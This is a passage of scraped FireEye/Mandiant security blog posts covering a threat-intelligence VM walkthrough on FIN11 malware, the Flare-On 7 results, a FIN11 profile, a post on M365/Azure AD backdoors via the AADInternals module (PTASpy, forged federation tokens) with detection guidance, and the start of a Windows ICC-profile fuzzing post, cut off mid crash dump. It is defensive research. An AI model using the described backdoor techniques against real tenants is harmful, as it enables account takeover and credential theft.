unattended. The script will set up the Boxstarter environment and proceed to download and install the ThreatPursuit VM environment, as seen in Figure 3. Figure 3: Installation script execution The installation process may take upwards of several hours depending on your internet connection speed and the web servers hosting the various files. Figure 4 shows the post-installation desktop environment, featuring the logo and a desktop shortcut. You will know when the install is finished with the VM's logo placed on the background. Figure 4: ThreatPursuit VM desktop installed Custom Install Is the standard installation too much for you? We provide a custom installation method that allows you to choose which chocolatey packages get installed. For additional details, see the Custom Install steps at our GitHub repository. Installing Additional Packages Since ThreatPursuit VM uses the Chocolatey Windows package manager, it's easy to install additional packages not included by default. For example, entering the command cinst github as administrator installs GitHub Desktop on your system. To update all currently installed packages to their most recent versions, run the command cup all as administrator. Getting Started: A Use Case As threat analysts, what we choose to pursue will depend on the priorities and requirements of our current role. Often, they vary with each threat or adversary encountered such as financial crime, espionage, issue-motivated groups or individuals. The role broadly encompasses the collection and analysis of threat data (e.g., malware, indicators of attack/compromise) with the goal of triaging the data and developing actionable intelligence. For example, one may want to produce detection signatures based on malware network communications to classify, share or disseminate indicators of compromise (IOCs) in standardized ways. We may also use these IOCs in order to develop and apply analytical products that establish clusters of analogous nodes such as MITRE ATT&CK tactics and techniques, or APT groups. On the other hand, our goal can be as simple as triaging a malware sample behavior, hunting for indicators, or proving or disproving a hypothesis. Let's look at how we might start. Open Hunting To start our use case, let’s say we are interested in reviewing latest threat actor activity reported for the quarter. We sign in to the Mandiant Advantage portal (Figure 5) using our public subscription to get a snapshot view of any highlighted activity (Figure 6). Figure 5: Mandiant Advantage portal Figure 6: Actor activity for Q3 2020 Based on Mandiant Advantage report, we notice a number of highly active APT and FIN actors. We choose to drill in to one of these actors by hovering our mouse and selecting the actor tag FIN11. We receive a high-level snapshot summary view of the threat actor, their targeted industry verticals, associated reports and much more, as seen in Figure 7. We also may choose to select the most recent report associated with FIN11 for review. Figure 7: FIN11 actor summary By selecting the “View Full Page” button as seen at the top right corner of Figure 6, we can use the feature to download indicators, as seen in the top right corner of Figure 8. Figure 8: Full FIN11 page Within the FIN11 report, we review the associated threat intelligence tags that contain finished intelligence products. However, we are interested in the collection of raw IOCs (Figure 9) that we could leverage to pivot off or enrich our own datasets. Figure 9: Downloaded FIN11 indicators Using the Malware Information Sharing Platform (MISP )as our collection point, we are going to upload and triage our indicators using our local MISP instance running on ThreatPursuit VM. Please note you will need to ensure your local MISP instance is running correctly with the configuration of your choosing. We select the “Add Event” button, begin populating all needed fields to prepare our import, and then click “Submit”, as shown in Figure 10. Figure 10: MISP triage of events Under the tags section of our newly created FIN11 event, we apply relevant tags to begin associating aspects of contextual information related to our target, as seen in Figure 11. Figure 11: MISP Event setup for FIN11 We then select “Add Attribute” into our event, which will allow us to import our MD5 hashes into the MISP galaxy, as seen in Figure 12. Using both the category and type, we select the appropriate values that best represent our dataset and prepare to submit that data into our event. Figure 12: MISP import events into FIN11 event MISP allows for a streamlined way to drill and tag indicators as well as enrich and pivot with threat intelligence. We can also choose to perform this enrichment process within MISP using a variety of open intelligence sources and their modules, such as Mandiant Advantage , PassiveTotal , Shodan and VirusTotal . We can also achieve the same result using similar tools already packaged in ThreatPursuit VM. Using Maltego CE, installed as part of the VM, we can automate aspects of targeted collection and analysis of our FIN11 malware families and associated infrastructure. The following are just some of the Maltego plugins that can be configured post installation to help with the enrichment and collection process: VirusTotal Public API ThreatCrowd Shodan API Targeting the suspected payload, we attempt to pivot using its MD5 hash value (113dd1e3caa47b5a6438069b15127707) to discover additional artifacts, such as infrastructure, domain record history, previously triaged reports, similar malware samples, timestamps, and the rich headers. Importing our hash into Maltego CE, we can proceed to perform a range of queries to hunt and retrieve interesting information related to our FIN11 malware, as seen in Figure 13. Figure 13: Maltego CE querying MD5 hash Quite quickly we pull back indicators; in this case, generic named detection signatures from a range of anti-malware vendors. Using VirusTotalAPI Public, we perform a series of collection and triage queries across a variety of configured open sources, as shown in Figure 14. Figure 14: Automating enrichment and analysis of targeted infrastructure A visual link has been made public for quick reference. With our newly identified information obtained by passively scraping those IOCs from a variety of data providers, we can identify additional hashes, delivery URLs and web command and control locations, as shown in Figure 15. Figure 15: Maltego visualization of FIN11 dropper Pivoting on the suspected FIN11 delivery domain near-fast[.]com, we have found several more samples that were uploaded to an online malware sandbox website AppAnyRun . Within the ThreatPursuit VM Google Chrome browser and in the Tools directory, there are shortcuts and bookmarks to a range of sandboxes to help with accessing and searching them quickly. We can use AppAnyRun to further analyze the heterogenous networks and execution behaviors of these acquired samples. We have identified another similar sample, which is an XLS document named “MONITIORING REPORT.xls” with the MD5 hash 5d7d2371668ad4a6484f76b0b6511961 (Figure 16). Let’s attempt to triage this newly discovered sample and qualify the relationship back to FIN11. Figure 16: VirusTotal execution report of 5d7d2371668ad4a6484f76b0b6511961 Extracting interesting strings and indicators from this sample allows us to compare these artifacts against our own dynamic analysis. If we can’t access the original malware sample, but we have other indicators to hunt with, we could also pivot on various unique characteristics and attributes (e.g., imphash, vthash, pdb string, etc...) to discover related samples. Even without access to the sample, we can also use YARA to mine for similar malware samples. One such source to mine is using the mquery tool and their datasets offered via CERT.PL. To fast track the creation of a YARA rule, we leverage the FIN11 YARA rule provided within the FIN11 Mandiant Advantage report . Simply copy and paste the YARA rule into mquery page and select “Query” to perform the search (Figure 17). It may take some time, so be sure to check back later (here are the results ). Figure 17: mquery YARA rule hunting search for FIN11 malware Within our mquery search, we find a generic signature hit on Win32_Spoonbeard_1_beta for the MD5 hash 3c43d080b5badfdde7aff732c066d1b2. We associate this MD5 hash with another sandbox, app.any.run, at the following URL: https://app.any.run/tasks/19ac204b-9381-4127-a5ac-d6b68e0ee92c/ As seen in Figure 18, this sample was first uploaded on May 2, 2019, with an associated infection chain intact. Figure 18: AppAnyRun Execution Report on 3c43d080b5badfdde7aff732c066d1b2 We now have a confident signature hit, but with different named detections on the malware family. This is a common challenge for threat analysts and researchers. However we have gained interesting information about the malware itself such as its execution behavior, encryption methods, dropped files, timelines and command and control server and beacon information. This is more than enough for us to pivot across our own datasets to hunt for previously seen activities and prepare to finalize our report. Once we are confident in our analysis, we can start to model and attribute the malware characteristics. We can leverage other threat exchange communities and intelligence sources to further enrich the information we collected on the sample. Enrichment allows the analysts to greater extrapolate context such as timings, malware similarity, associated infrastructures, and prior targeting information. We will briefly add our content into our MISP instance and apply tags to finalize our review. We may wish to add MITRE ATT&CK tags (Figure 19) relevant across the malware infection chain for our sample as they could be useful from a modelling standpoint. Figure 19: MITRE ATT&CK tags for the malware sample Final Thoughts We hope you enjoyed this basic malware triage workflow use-case using ThreatPursuit VM. There are so many more tools and capabilities within the included toolset such as Machine learning (ML) and ML algorithms, that also assist threat hunters by analyzing large volumes of data quickly. Check out some of FireEye’s ML blog posts here. For a complete list of tools please see the ThreatPursuit VM GitHub repository . We look forward to releasing more blog posts, content and playbooks as our user base grows. And finally, here are some related articles that might be of interest. Malware Analysis Open Sourcing StringSifter capa: Automatically Identify Malware Capabilities Learning to Rank Strings Output for Speedier Malware Analysis Analyzing Dark Crystal RAT, a C# Backdoor Navigating the Maze: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents Digital Forensics Using Real-Time Events in Investigations A \"DFUR-ent\" Perspective on Threat Modeling and Application Log Forensic Analysis SCANdalous! (External Detection Using Network Scan Data and Automation) Intelligence Analysis and Assessments Managed Defense: The Analytical Mindset How Strategic Intelligence Helps Organizations Make Sense of the Threat Landscape Limited Shifts in the Cyber Threat Landscape Driven by COVID-19 They Come in the Night: Ransomware Deployment Trends Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/10/flare-on-7-challenge-solutions.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-10-24",
                    "source": "www.fireeye.com"
                },
                "text": "We are thrilled to announce the conclusion of the seventh annual Flare-On challenge. This year proved to be the most difficult challenge we’ve produced, with the lowest rate of finishers. This year’s winners are truly the elite of the elite! Lucky for them, all 260 winners will receive this cyberpunk metal key. We would like to thank the challenge authors individually for their great puzzles and solutions: fidler – Nick Harbour ( @nickharbour ) garbage – Jon Erickson Wednesday – Blaine Stancill ( @MalwareMechanic ) report – Moritz Raabe ( @m_r_tz ) TKApp – Moritz Raabe ( @m_r_tz ) CodeIt – Mike Hunhoff ( @mehunhoff ) re_crowd – Chris Gardner, Moritz Raabe, Blaine Stancill Aardvark – Jacob Thompson crackinstaller – Paul Tarter ( @Hefrpidge ) break – Chris Gardner Rabbit Hole – Sandor Nemes ( @sandornemes ) This year’s Flare-On challenge was the first to feature a live public scoreboard, so players could track their progress and the progress of previous Flare-On challenge champions. Despite this increased data at your fingertips, we are still going to bring you even more stats. As of 11:00am ET, participation was near record setting levels at 5,648 players registered. 3,574 of those players finished at least one challenge. The U.S. reclaimed the top spot for total finishers with 22. Singapore was once again in second place, but in uncontested first place per capita, with one Flare-On finisher for every 296,000 living persons in Singapore. This is the first year we have included a per capita finishers by country chart, and we did it to highlight just what a remarkable concentration of talent exists in some corners of the world. Consistent top finisher Russia took third place, and a growing player base in Germany and Israel came into full bloom this year, with those countries edging out other frequent top five countries such as China, India and Vietnam. All the binaries from this year’s challenge are now posted on the Flare-On website . Here are the solutions written by each challenge author: SOLUTION #1 SOLUTION #2 SOLUTION #3 SOLUTION #4 SOLUTION #5 SOLUTION #6 SOLUTION #7 SOLUTION #8 SOLUTION #9 SOLUTION #10 SOLUTION #11 Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/10/fin11-email-campaigns-precursor-for-ransomware-data-theft.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-10-14",
                    "source": "www.fireeye.com"
                },
                "text": "Mandiant Threat Intelligence recently promoted a threat cluster to a named FIN (or financially motivated) threat group for the first time since 2017. We have detailed FIN11's various tactics, techniques and procedures in a report that is available now by signing up for Mandiant Advantage Free . In some ways, FIN11 is reminiscent of APT1; they are notable not for their sophistication, but for their sheer volume of activity. There are significant gaps in FIN11’s phishing operations, but when active, the group conducts up to five high-volume campaigns a week. While many financially motivated threat groups are short lived, FIN11 has been conducting these widespread phishing campaigns since at least 2016. From 2017 through 2018, the threat group primarily targeted organizations in the financial, retail, and hospitality sectors. However, in 2019 FIN11’s targeting expanded to include a diverse set of sectors and geographic regions. At this point, it would be difficult to name a client that FIN11 hasn’t targeted. Mandiant has also responded to numerous FIN11 intrusions, but we’ve only observed the group successfully monetize access in few instances. This could suggest that the actors cast a wide net during their phishing operations, then choose which victims to further exploit based on characteristics such as sector, geolocation or perceived security posture. Recently, FIN11 has deployed CLOP ransomware and threatened to publish exfiltrated data to pressure victims into paying ransom demands. The group’s shifting monetization methods—from point-of-sale (POS) malware in 2018, to ransomware in 2019, and hybrid extortion in 2020—is part of a larger trend in which criminal actors have increasingly focused on post-compromise ransomware deployment and data theft extortion. Notably, FIN11 includes a subset of the activity security researchers call TA505 , but we do not attribute TA505’s early operations to FIN11 and caution against using the names interchangeably. Attribution of both historic TA505 activity and more recent FIN11 activity is complicated by the actors’ use of criminal service providers. Like most financially motivated actors, FIN11 doesn’t operate in a vacuum. We believe that the group has used services that provide anonymous domain registration, bulletproof hosting, code signing certificates, and private or semi-private malware. Outsourcing work to these criminal service providers likely enables FIN11 to increase the scale and sophistication of their operations. To learn more about FIN11’s evolving delivery tactics, use of services, post-compromise TTPs, and monetization methods, register for Mandiant Advantage Free . The full FIN11 report is also available through our FireEye Intelligence Portal (FIP) . Then for even more information, register for our exclusive webinar on Oct. 29 where Mandiant threat intelligence experts will take a deeper dive into FIN11, including its origins, tactics, and potential for future activity. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-09-30",
                    "source": "www.fireeye.com"
                },
                "text": "Mandiant has seen an uptick in incidents involving Microsoft 365 (M365) and Azure Active Directory (Azure AD). Most of these incidents are the result of a phishing email coercing a user to enter their credentials used for accessing M365 into a phishing site. Other incidents have been a result of password spraying, password stuffing, or simple brute force attempts against M365 tenants. In almost all of these incidents, the user or account was not protected by multi-factor authentication (MFA). These opportunistic attacks are certainly the most common form of compromise for M365 and Azure AD, and are usually the initial vector to establish persistence. During both incident response (IR) engagements and proactive cloud assessments we are often asked: What are some other types of attacks that Mandiant is seeing against M365 and Azure AD? Is it possible for an on-premises compromise to “vertically” move to M365 and Azure AD? If a global administrator account is compromised, is it possible to maintain persistence even after the compromised account has been detected, a password reset has occurred, and MFA has been applied? AADInternals PowerShell Module In some incidents, Mandiant has witnessed attackers utilizing a PowerShell module called AADInternals , which can allow an attacker to vertically move from on-premises to Azure AD, establish backdoors, steal passwords, generate user security tokens, and bypass MFA protections. This PowerShell module has allowed attackers to maintain persistence in the tenant even after initial eradication efforts were conducted. To see this module in action and understand how it works, Dr. Nestori Syynimaa’s PSCONFEU 2020 presentation, Abusing Azure Active Directory: Who would you like to be today? , provides an in-depth overview of the module. To detect the use of AADInternals, it is important to understand how some of these attacks work. Once an understanding is established, abnormal usage can be detected through a combination of log analysis and host-based indicators. Backdoor 1: Abusing Pass-Through Authentication Attacker Requirements Local Administrative Access to a server running Pass-through Authentication Or M365 global administrator credentials The AADInternals PowerShell module contains a function called Install-AADIntPTASPY . The function works by inserting itself as a man-in-the-middle within the Pass-through Authentication (PTA) process that occurs between Azure AD and the server running the PTA Agent in the on-premises environment. Commonly, the PTA Agent runs on the same on-premises server as Azure AD Connect (AAD Connect). When PTA is enabled, every logon that occurs against Azure AD gets redirected to the PTA Agent on-premises. The PTA Agent asks an on-premises Active Directory Domain Controller if a password is valid for an authenticating account. If valid, the PTA Agent responds back to Azure AD to grant the requestor access. Figure 1 provides the workflow of Pass-through Authentication and where AADInternals can intercept the request. Figure 1: Pass-through Authentication workflow Once the function is running, every PTA attempt against Azure AD will be intercepted by the installed AADIntPTASpy module. The module will record the user’s password attempt and reply back to Azure AD on behalf of the PTA Agent. This reply advises Azure AD the password attempt was valid and grants the user access to the cloud, even if the password is incorrect. If an attacker has implanted AADIntPTASpy , they can log in as any user that attempts to authenticate using PTA—and will be granted access. Additionally, all password attempts that are registered by the AADIntPTASpy module are recorded within a log file on the server (Default location: C:\\PTASpy\\PTASPy.csv ). Figure 2 shows how the log file can be decoded to reveal a user’s password in cleartext. Figure 2: PTASpy.csv decoded passwords Not only will this function allow an attacker to login as any user who authenticates via PTA, but it will also act as a repository for collecting user passwords who are legitimately logging into Azure AD. This could allow an attacker to pivot their attack to other areas of the network—or use these credentials against other internet accessible portals that may leverage single-factor authentication (e.g., VPN gateway). An attacker can use this module in one of two ways: Method 1: On-Premises Compromise An attacker has gained access to an on-premises domain and is able to laterally move to the AADConnect / PTA Agent Server. From this server, an attacker can potentially leverage the AADInternals PowerShell module and invoke the Install-AADIntPTASpy function. Method 2: Cloud Compromise If an attacker has successfully compromised an Azure AD global admin account , an attack can be conducted from an attacker’s own infrastructure. An attacker can install a PTA Agent on a server they manage and register the agent using the compromised global administrator account (Figure 3). Figure 3: Azure AD Portal—registered Pass-through Authentication agents Once registered with Azure AD, the rogue server will begin to intercept and authorize all login attempts. As with Method 1, this server can also be used to harvest valid credentials. Backdoor 2: Abusing Identity Federation Attacker Requirements Local administrative access to AD and server running Active Directory Federation Services Or M365 global administrator credentials Another method of authenticating to M365 is through the usage of federation services. When a M365 domain is configured as a federated domain, a trust is configured between M365 and an external identify provider. In many cases, this trust is established with an Active Directory Federation Services (ADFS) server for an on-premises Active Directory domain. Once a trust is established, when a user logs into M365 using a federated domain, their request is redirected to the external identify provider (ADFS) where their authentication is validated (Figure 4). Once validated, the ADFS server provides the user a security token. This token is then trusted by M365 and grants the access to the platform. Figure 4: Microsoft 365 Federation Sign-in workflow AADInternals has a PowerShell function to craft security tokens, which mimics the ADFS authentication process. When providing the function a valid UserPrincipalName, Immutable ID and IssuerURI, an attacker can generate a security token as any user of the tenant. What’s even more concerning is that once this security token is generated, this can allow an attacker to bypass MFA. As with Backdoor 1, this attack can either be performed from a compromised on-premises environment or from an attacker’s own infrastructure. Method 1: On-Premises Compromise Once an attacker has gained access to an on-premises domain with elevated access, they can begin to collect the required information to craft their own security tokens to backdoor into M365 as any user. An attacker will require: A valid UserPrincipalName and Immutable. Both of these attributes can be pulled from the on-premises Active Directory domain. IssuerURI of the ADFS server and ADFS Signing certificate. This can be obtained from an ADFS server when directly logged into the server or remotely querying the server via an privileged account. Once an attacker has collected the necessary information, using the AADInternals Open-AADIntOffice365Portal command, a security token for the user can be generated granting an attacker access to M365 (Figure 5). Figure 5: AADInternals Open-AADIntOffice365Portal command Method 2: Cloud Compromise If an attacker has a compromised an M365 Global Administrator account, using their own infrastructure, an attacker can use their administrative access to collect user information and reconfigure the tenant to establish their backdoor. In this method, an attacker will require: A valid UserPrincipalName and valid ImmutableId. Figure 6 shows how the Get-MsolUser command can obtain a user’s ImmutableId from Azure AD. Figure 6: Get-MsolUser—list user UPN & ImmutableId IssuerURI This can be obtained by converting a managed domain to a federated domain. Figures 7 through 10 show how the AADInternals ConvertTo-AADIntBackdoor command (Figure 8) can be used to allow attacker to register their own IssuerURI for a federated domain. Figure 7: Get-msoldomain—list of registered domains and authentication Figure 8: ConvertTo-AADIntBackdoor—convert domain to federated authentication Figure 9: Changed authentication method Figure 10: Azure AD Portal registered domains Note: To not interrupt production and authentication with an existing federated domain (and to remain undetected), an attacker may opt to register a new domain with the tenant. Figure 11: AADInternals Open-AADIntOffice365Portal Command using new Federated domain Once an attacker has properly configured the tenant, using the ImmutableId of any user, a security token can be generated by executing the Open-AADIntOffice365Portal command (Figure 11). This will allow an attacker to login as that user without the need for a valid certificate or a legitimate IssuerURI. Fortunately for defenders, this method will generate a number of events in the unified audit log, which can be leveraged for monitoring and alerting. Mitigation and Detection Once persistence is established, it can be extremely difficult to detect login activity that is utilizing one of the previously described methods. In lieu of this, it is recommended to monitor and alert on M365 unified audit logs and Azure AD sign-in activity to detect anomalous activity. Detection in FireEye Helix Being that Mandiant has seen this methodology being used in the wild, we felt it was necessary to build these detections into our FireEye Helix security platform. Helix engineers have created sever new detection rules that monitor for detectable activity of an attacker making use of the AADInternals PowerShell module. The following five rules will monitor a server’s event logs and alert upon the installation and usage of the AADInternals PowerShell module (Figure 12). The detection of these activities could be high fidelity alerts that an attacker is preparing to configure backdoors into M365 and Azure AD environments. Figure 12: AADInternals Helix rules If an attacker has successfully configured a backdoor using AADInternals, Helix will alert upon the following events registered in the Office 365 unified audit log and Azure Activity Log as indication of a possible event (Figure 13 and Figure 14). It is important to note that these alerts could be triggered upon legitimate administrator activity. When responding to these alerts, first check with your M365 and Azure AD administrator to verify the activity before raising a security event. Figure 13: Office 365 and Azure Helix rules Figure 14: PTA Connector Registered alert description Hunting for Backdoors in M365 Unified Audit Logs and Azure AD Logs If you suspect a global administrator account was compromised and you want to review Azure AD for indicators of potential abuse, the following should be reviewed (note that these same concepts can be used for proactive log monitoring): From Azure AD Sign-ins logs, monitor logon activity from On-Premises Directory Synchronization Service Accounts. This account is used by the Azure AD Connect service (Figure 15). Figure 15: Azure AD Sign-ins Baseline the IP addresses used by this account and make sure the IPs match those assigned to the on-premises WAN infrastructure. If the attacker has configure a PTA Agent on their own infrastructure, seeing an IP that does not match your baseline could be an indicator that a rogue PTA Agent has been configured by the attacker (Figure 16). Figure 16: Azure AD Sign-in logs—On-Premises Directory Synchronization Services account From Azure AD Sign-ins, monitor and baseline Azure AD Sign-ins to the Azure AD Application Proxy Connector. Make sure to validate username, IP and location. These events are typically only generated when a new PTA agent is connected to the tenant. This could be an indicator that an attacker has connected a rogue PTA server hosted on an attacker’s infrastructure (Figure 17). Figure 17: Azure AD Sign-in logs—Azure AD Application Proxy Connector If using Azure Sentinel, this event will also be registered in the Azure AuditLogs table as a “ Register Connector ” OperationName (Figure 18). Figure 18: Register Connector—Azure Sentinel logs In the Azure Management Portal under the Azure AD Connect blade, review all registered servers running PTA Agent. The Authentication Agent and IP should match your infrastructure (Figure 19). Log in to https://portal.azure.com Select Azure AD Connect > Pass-through Authentication Figure 19: Azure Active Directory Pass-through Authentication agent status Monitor and alert for \"Directory Administration Activity\" in Office 365 Security & Compliance Center’s unified audit log. When an attacker is able to create a domain federation within a compromised cloud tenant, and link this to attacker-owned infrastructure, this will generate activity in the log (Figure 21). https://Protections.office.com/unifiedauitlog > Audit Log Search Select Directory Administration Activates category to select all activities Create New Alert Policy (Figure 20) Figure 20: Unified Audit Log > Create new alert policy Figure 21: Unified Audit Log filtered for domain related events Using Azure Sentinel, more granular Directory Administration Activities can be modified for suspicious activity. This includes additions, deletions and modifications of domains and their authentication settings (Figure 22). Monitoring for OfficeActivity Operations in Azure Sentinel can allow an organization to validate if this is normalized activity or if an attacker is working on setting up a backdoor for PTA or federation. Table: OfficeActivity Operation: Set-AcceptedDomain Operation: Set-MsolDomainFederationSettings Operation: Add-FederatedDomain Operation: New-Accepted Domain Operation: Remove-Accepted Domain Operation: Remove-FederatedDomain Figure 22: OfficeActivity Operations Azure Sentinel logs Detection On-Premises If an attacker is able to compromise on-premises infrastructure and access a server running AD Connect or ADFS services with the intention of leveraging a tool such as AADInternals to expand the scope of their access to include cloud, timely on-premises detection and containment is key. The following methods can be leveraged to ensure optimized visibility and detection for the scope of activities described in this post: Treat ADFS and Azure AD Connect servers as Tier 0 assets . Use a dedicated server for each. Do not install these roles and server in addition to other. All too often we are seeing Azure AD Connect running on a file server. Ensure PowerShell logging is optimized on AD Connect and ADFS servers Review Microsoft-Windows-PowerShell/Operational logs on ADFS and AADConnect Server Logs. If PowerShell logging is enabled, search for Event ID 4101. This event ID will record the event where AADInternals was installed (Figure 23). Figure 23: EventID 410—Installed Module Additionally, with this logging enabled, you will be able to review the PowerShell commands used by an attacker. In PowerShell, run Get-Module -All and look for the presence of AADInternals (Figure 24). Figure 24: Get-Module command to list installed modules Alert for the presence of C:\\PTASpy and C:\\PTASpy\\PTASpy.csv. This is the default location of the log file that contains records of all the accounts that were intercepted by the tool. Remember, an attacker may also use this to harvest credentials, so it is important to reset the password for these accounts (Figure 25). Figure 25: PTASpy.csv log activity Mitigations In order for this attack to be successful, an attacker must gain administrative privileges on a server running Azure AD Connect and/or gain global administrator rights within M365. Simple practices such as limiting and properly protecting global administrator accounts as well as properly protecting Tier 0 assets can greatly reduce the risk of an attacker successfully using the AADInternals PowerShell against your organization. Limit or restrict access to Azure AD Connect servers. Any server acting as an identity provider or facilitating identity federation should be treated as a Tier 0 asset. Create separate dedicated global administrator accounts . Global administrators should be cloud-only accounts. These accounts should not retain any licensing. Implement MFA on all accounts: admins, users and services. If a particular account cannot use MFA, apply a conditional access rule that limits its logon to a trusted network. This works particularly well for service accounts. Establish a roadmap to block legacy authentication . Limit which accounts are synced from on-premises to the cloud . Do not sync privileged or service accounts to the cloud. Use Azure administrative roles . Not everybody or everything needs to be a global admin to administer the environment. Use password hash sync over Pass-through Authentication. Many organizations are reluctant to sync their password to Azure AD. The benefits from this service greatly outweigh the risks. Being able to use global and custom banned passwords lists , for both the cloud and on-premises , is a tremendous benefit. Forward all M365 unified audit logs and Azure logs to a SIEM and build detections. Ensure you are forwarding the logs recommended in this post and building the appropriate detections and playbooks within your security operations teams. Specifically monitor for: Set-AcceptedDomain Set-MsolDomainFederationSettings Add-FederatedDomain New-Accepted Domain Remove-Accepted Domain Remove-FederatedDomain Periodically review all identity providers and custom domains configured in the M365 tenant. If an attacker is successful at gaining global administrative privileges, they may choose to add their own identity provider and custom domain to maintain persistence. Acknowledgements I want to give a special thanks to Daniel Taylor, Roberto Bamberger and Jennifer Kendall at Microsoft for collaborating with Mandiant on the creation of this blog post. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/09/fuzzing-image-parsing-in-windows-color-profiles.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-09-24",
                    "source": "www.fireeye.com"
                },
                "text": "Image parsing and rendering are basic features of any modern operating system (OS). Image parsing is an easily accessible attack surface, and a vulnerability that may lead to remote code execution or information disclosure in such a feature is valuable to attackers. In this multi-part blog series, I am reviewing Windows OS’ built-in image parsers and related file formats: specifically looking at creating a harness, hunting for corpus and fuzzing to find vulnerabilities. In part one of this series I am looking at color profiles—not an image format itself, but something which is regularly embedded within images. What is an ICC Color Profile? Wikipedia provides a more-than-adequate description of ICC color profiles : \"In color management, an ICC profile is a set of data that characterizes a color input or output device, or a color space, according to standards promulgated by the International Color Consortium (ICC). Profiles describe the color attributes of a particular device or viewing requirement by defining a mapping between the device source or target color space and a profile connection space (PCS). This PCS is either CIELAB (L*a*b*) or CIEXYZ. Mappings may be specified using tables, to which interpolation is applied, or through a series of parameters for transformations. ” In simpler terms, an ICC color profile is a binary file that gets embedded into images and parsed whenever ICC supported software processes the images. Specification The ICC specification is around 100 pages and should be easy to skim through. Reading through specifications gives a better understanding of the file format, different types of color profiles, and math behind the color transformation. Furthermore, understanding of its file format internals provides us with information that can be used to optimize fuzzing, select a good corpus, and prepare fuzzing dictionaries. History of Color Management in Windows Windows started to ship Image Color Management (ICM) version 1.0 on Windows 95, and version 2.0 beginning with Windows 98 onwards. A major overhaul to Windows Color System (WCS) 1.0 happened in Windows Vista onwards. While ICC color profiles are binary files, WCS color profiles use XML as its file format. In this blog post, I am going to concentrate on ICC color profiles. Microsoft has a list of supported Windows APIs . Looking into some of the obviously named APIs, such as OpenColorProfile , we can see that it is implemented in MSCMS.dll. This DLL is a generic entry point and supports loading of Microsoft’s Color Management Module (CMM) and third-party CMMs such as Adobe’s CMM. Microsoft’s CMM—the ICM—can be found as ICM32.dll in system32 directory. Figure 1: ICM32 Windows’ CMM was written by a third-party during the Windows 95 era and still ships more or less with the same code (with security fixes over the decades). Seeing such an old module gives me some hope of finding a new vulnerability. But this is also a small module that may have gone through multiple rounds of review and fuzzing: both by internal product security teams and by external researchers, reducing my hopes to a certain degree. Looking for any recent vulnerabilities in ICM32, we can see multiple bugs from 2017-2018 by Project Zero and ZDI researchers, but then relative silence from 2019 onwards. Making a Harness Although there is a list of ICM APIs in MSDN, we need to find an API sequence used by Windows for any ICC related operations. One of the ways to find our API sequence is to search a disassembly of Windows DLLs and EXEs in hope to find the color profile APIs being used. Another approach is to find a harness for open source Color Management Systems such as Little CMS (LCMS). Both of these end up pointing to very small set of APIs with functionality to open color profiles and create color transformations. Given this information, a simple initial harness was written: #include <stdio.h> #include <Windows.h> #include <Icm.h> #pragma comment(lib, \"mscms.lib\") int main(int argc, char** argv) { char dstProfilePath[] = \"sRGB Color Space Profile.icm\"; tagPROFILE destinationProfile; HPROFILE   hDstProfile = nullptr; destinationProfile.dwType = PROFILE_FILENAME; destinationProfile.pProfileData = dstProfilePath; destinationProfile.cbDataSize = (strlen(dstProfilePath) + 1); hDstProfile = OpenColorProfileA(&destinationProfile, PROFILE_READ, FILE_SHARE_READ, OPEN_EXISTING); if (nullptr == hDstProfile) { return -1; } tagPROFILE sourceProfile; HPROFILE   hSrcProfile = nullptr; HTRANSFORM hColorTransform = nullptr; DWORD dwIntent[] = { INTENT_PERCEPTUAL, INTENT_PERCEPTUAL }; HPROFILE hProfileList[2]; sourceProfile.dwType = PROFILE_FILENAME; sourceProfile.pProfileData = argv[1]; sourceProfile.cbDataSize = (strlen(argv[1]) + 1); hSrcProfile = OpenColorProfileA(&sourceProfile, PROFILE_READ, FILE_SHARE_READ, OPEN_EXISTING); if (nullptr == hSrcProfile) { return -1; } hProfileList[0] = hSrcProfile; hProfileList[1] = hDstProfile; hColorTransform = CreateMultiProfileTransform( hProfileList, 2, dwIntent, 2, USE_RELATIVE_COLORIMETRIC | BEST_MODE, INDEX_DONT_CARE ); if (nullptr == hColorTransform) { return -1; } DeleteColorTransform(hColorTransform); CloseColorProfile(hSrcProfile); CloseColorProfile(hDstProfile); return 0; } Listing 1: Harness Hunting for Corpus and Dictionary Sites offering multiple color profiles can be found all over the internet. One of the other main source of color profile is images; many image files contain a color profile but require some programming/tools to dump their color profile to stand-alone files. Simply skimming through the specification, we can also make sure the corpus contains at least one sample from all of the seven different color profiles. This along with the code coverage information can be used to prepare the first set of corpuses for fuzzing. A dictionary, which helps the fuzzer to find additional code paths, can be prepared by combing through specifications and creating a list of unique tag names and values. One can also find dictionaries from open source fuzzing attempts on LCMS, etc. Fuzzing I used a 16-core machine to fuzz the harness with my first set of corpuses. Code coverage information from MSCMS.dll and ICM32.dll was used as feedback for my fuzzer. Crashes started to appear within a couple of days. CVE-2020-1117 — Heap Overflow in InitNamedColorProfileData The following crash happens in icm32!SwapShortOffset while trying to read out of bounds: 0:000> r rax=0000023690497000 rbx=0000000000000000 rcx=00000000000000ff rdx=000000000000ffff rsi=0000023690496f00 rdi=0000023690496fee rip=00007ffa46bf3790 rsp=000000c2a56ff5a8 rbp=0000000000000001 r8=0000000000000014  r9=0000023690497002 r10=0000000000000014 r11=0000000000000014 r12=000000c2a56ff688 r13=0000023690492de0 r14=000000000000000a r15=000000004c616220 iopl=0         nv up ei ng nz ac pe cy cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000293 icm32!SwapShortOffset+0x10: 00007ffa`46bf3790 0fb610          movzx   edx,byte ptr [rax] ds:00000236`90497000=?? 0:000> !heap -p -a @rax address 0000023690497000 found in _DPH_HEAP_ROOT @ 23690411000 in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize) 23690412b60:      23690496f00              100 -      23690496000             2000 00007ffa51644807 ntdll!RtlDebugAllocateHeap+0x000000000000003f 00007ffa515f49d6 